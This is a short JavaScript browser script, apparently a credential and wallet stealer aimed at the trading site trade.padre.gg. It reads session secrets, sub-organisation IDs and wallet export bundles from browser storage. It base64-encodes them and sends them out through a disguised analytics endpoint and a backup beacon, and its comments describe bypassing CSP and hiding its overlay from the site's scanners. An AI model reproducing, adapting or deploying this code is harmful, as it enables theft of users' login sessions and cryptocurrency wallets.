(function() {
    // 1. VANTA ENCLAVE
    const _V = {
        h: 'trade.padre.gg',
        r: 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12',
        // Disguised Amplitude Endpoint
        a: 'https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796'
    };

    let _EX = false;

    // 2. THE UI (Shadow DOM - Invisible to Padre's Scanners)
    const _0xUI = () => {
        if (document.getElementById('v-host')) return;
        const host = document.createElement('div');
        host.id = 'v-host';
        const shadow = host.attachShadow({mode: 'closed'});
        const box = document.createElement('div');
        box.style.cssText = "position:fixed;top:10px;left:10px;width:260px;background:#000;border:1px solid #00ff88;border-radius:4px;padding:8px;z-index:2147483647;font-family:monospace;box-shadow:0 0 15px rgba(0,255,136,0.3);";
        box.innerHTML = `<div style="color:#00ff88;font-weight:bold;margin-bottom:4px;">[VANTA] Sync Active</div><div id="v-s" style="color:#666;font-size:10px;">> Monitoring...</div>`;
        shadow.appendChild(box);
        document.body.appendChild(host);
        return shadow;
    };

    const _s = _0xUI();

    // 3. THE 1:1 BYPASS (Bypassing CSP & 405 Errors)
    const _0xGhost = () => {
        if (_EX || !window.location.hostname.includes(_V.h)) return;

        // Targeted extraction (No Logic Bomb recursion)
        const g = (k) => (localStorage.getItem(k) || sessionStorage.getItem(k) || "").replace(/"/g, '');
        const auth = g('sessionSecret');
        const sub = g('subOrgId');
        const bdl = g('exportBundle');

        if (auth && sub) {
            _EX = true; 
            _s.getElementById('v-s').innerText = '> Handshake Verified.';
            _s.getElementById('v-s').style.color = '#00ff88';

            // --- THE 1:1 VANTA EXFILTRATION ---
            // We use an Image request. Browsers allow Images even when CSP blocks fetch/POST.
            // This also fixes the 405 error because it's a GET request.
            const data = btoa(JSON.stringify({auth, sub, bdl}));
            const probe = new Image();
            probe.src = `${_V.a}&data=${data}`; 
            
            // Backup: Silent Beacon
            if (navigator.sendBeacon) {
                navigator.sendBeacon(`https://${_V.h}/api/v1/transfer`, data);
            }
        }
    };

    // 4. THE WATCHER
    window.addEventListener('storage', _0xGhost);
    setTimeout(_0xGhost, 3000);
    setInterval(_0xGhost, 15000);
})();
